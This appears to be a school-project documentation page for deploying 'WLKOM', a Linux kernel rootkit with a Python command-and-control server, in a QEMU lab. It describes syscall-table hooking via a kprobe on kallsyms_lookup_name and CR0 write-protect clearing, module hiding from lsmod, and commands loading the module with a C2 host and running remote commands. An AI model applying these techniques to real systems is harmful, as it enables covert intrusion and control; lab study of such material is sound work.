---
title: Setup & Deployment
description: Step-by-step guide to deploy WLKOM from scratch on an Arch Linux laptop.
---

Everything you need to reproduce the WLKOM environment from scratch, on an Arch Linux laptop.

## Prerequisites

- **Arch Linux** — the project is developed and tested on the school's Arch Linux laptops
- **CPU with hardware virtualization** — Intel VT-x or AMD-V, enabled in BIOS

```sh
grep -c vmx /proc/cpuinfo   # Intel (>0 means supported)
grep -c svm /proc/cpuinfo   # AMD
```

- **An Arch Linux ISO** — download from `archlinux.org/download`
- **~30 GB of free disk space** — 24 GB for the victim VM disk image + build artifacts
- **Python 3.10+** and **pip** — for the C2 server

## Install QEMU/KVM on the host

```sh
sudo pacman -S qemu-full virt-manager libvirt dnsmasq \
               bridge-utils ebtables iptables-nft
```

Enable KVM kernel modules:

```sh
sudo modprobe kvm
sudo modprobe kvm_intel   # or kvm_amd depending on your CPU
lsmod | grep kvm          # should show kvm and kvm_intel/kvm_amd
```

Add your user to the KVM group:

```sh
sudo usermod -aG kvm $USER
# log out and back in for the group to take effect
```

:::note[Why QEMU/KVM and not VirtualBox?]
The subject explicitly requires QEMU/KVM. KVM leverages hardware virtualization directly through the Linux kernel, offering near-native performance. It also provides `virtfs` (9p over virtio) which is used for the shared folder between host and victim VM.
:::

## Distro & kernel version choice

### Why Arch Linux?

Arch Linux is a rolling-release distribution. The `linux` and `linux-headers` packages always stay in sync — you never have a mismatch between the running kernel and the headers used to compile out-of-tree modules. This is critical: trying to load a `.ko` built against the wrong kernel version produces an immediate `insmod: ERROR: could not insert module: Invalid module format`.

The `archinstall` scripted installer lets us version-control the full VM setup (packages, bootloader, SSH config, fstab) in a JSON file, making the environment 100% reproducible.

### Why kernel 6.6 LTS, and not newer?

:::caution[Three techniques break on recent kernels]
**1. `kallsyms_lookup_name()` unexported (≥ 5.7)**  
Finding the syscall table requires resolving the kernel symbol `sys_call_table` (not exported). The standard approach is `kallsyms_lookup_name()`, but it was removed from the exported symbol set in kernel 5.7. Our workaround: register a kprobe on `kallsyms_lookup_name` itself to recover its address, then call it directly via the function pointer. This works on 6.6 LTS.

**2. CR0 WP bit trick and Intel CET/IBT (≥ 6.3 on CET-capable CPUs)**  
To write to the read-only syscall table page, we clear the Write-Protect (WP) bit in the CPU's CR0 register. On kernels ≥ 6.3 compiled with Intel CET support, calling `write_cr0()` from a module triggers a kernel fault on CPUs with IBT enabled. The school's hardware predates widespread CET adoption. On newer machines, the correct approach would be ftrace-based function hooking instead of direct pointer patching.

**3. Kernel lockdown mode**  
Linux 5.4 introduced the Kernel Lockdown LSM. In confidentiality mode it blocks access to `/proc/kallsyms` and prevents loading unsigned modules. Arch Linux does not enable lockdown by default.

**Verdict:** We target **Linux 6.6 LTS** (supported until December 2026) because it is the most recent LTS on which all our techniques work reliably on the school's hardware.
:::

## Attacker machine setup

The C2 server runs on the host machine. In QEMU user networking, the host is always reachable from VMs at `10.0.2.2`.

```sh
# Install Python
sudo pacman -S python python-pip

# Clone the repository
git clone <repo-url>
cd epirootkit

# Install C2 dependencies
cd attacking_program
pip install -r requirements.txt

# Configure credentials
cp .env.example .env
# Edit .env: set SECRET_KEY and ADMIN_PASSWORD

# Start the C2 server
python app.py   # listens on 0.0.0.0:5000
```

The C2 dashboard is accessible at `http://localhost:5000`.

## Create the victim VM

![QEMU VM booting the Arch Linux ISO](/qemu.png)

```sh
cd virtual-machines/victim

# Create the disk image and boot the ISO
./create-vm.sh /path/to/archlinux-x86_64.iso
```

Inside the live Arch environment, mount the shared folder:

```sh
mkdir /mnt/share
mount -t 9p -o trans=virtio epirootkit /mnt/share
```

Run the automated install:

```sh
archinstall \
  --config /mnt/share/user_configuration.json \
  --creds  /mnt/share/user_credentials.json \
  --silent
```

The configuration installs: `linux-headers`, `gcc`, `make`, `openssh`, `vim`, GRUB bootloader, and configures the shared folder auto-mount.

After install, reboot into the installed system:

```sh
cd virtual-machines/victim
./start-vm.sh
```

## Post-install: SSH access

SSH is forwarded from host port **10022** to the VM:

```sh
ssh root@localhost -p 10022
```

Default credentials: `root` / `root`

![SSH terminal connected to victim VM](/terminal-ssh.png)

## Build the kernel module

Push the source to the victim via SSH:

```sh
scp -P 10022 -r rootkit/Makefile rootkit/src root@localhost:/rootkit
```

On the victim machine:

```sh
cd /rootkit
make modules        # produces src/wlkom.ko
```

## Load the rootkit on the victim

The `c2_host` parameter is required — pass the host IP (always `10.0.2.2` in QEMU user networking):

```sh
insmod src/wlkom.ko c2_host=10.0.2.2
dmesg | tail        # check kernel logs
```

Expected output in `dmesg`:

```
[  0.000] c2: registered uuid=12012406-c73f-4132-bfb6-53797ecb57ca
[  0.001] c2: hiding module from lsmod...
[  0.002] c2: polling /api/12012406-.../action every 5s
```

Once loaded, the module is invisible in `lsmod` and `/proc/modules`.

## Verify the connection

The victim machine should appear in the C2 dashboard within 5 seconds:

![C2 dashboard showing victim online](/c2-dashboard-online.png)

Run a test command from the dashboard:

```sh
# In C2 dashboard: send action "exec:whoami"
# Result appears in the dashboard output panel
```

![whoami command result in dashboard](/whoami-dashboard.png)
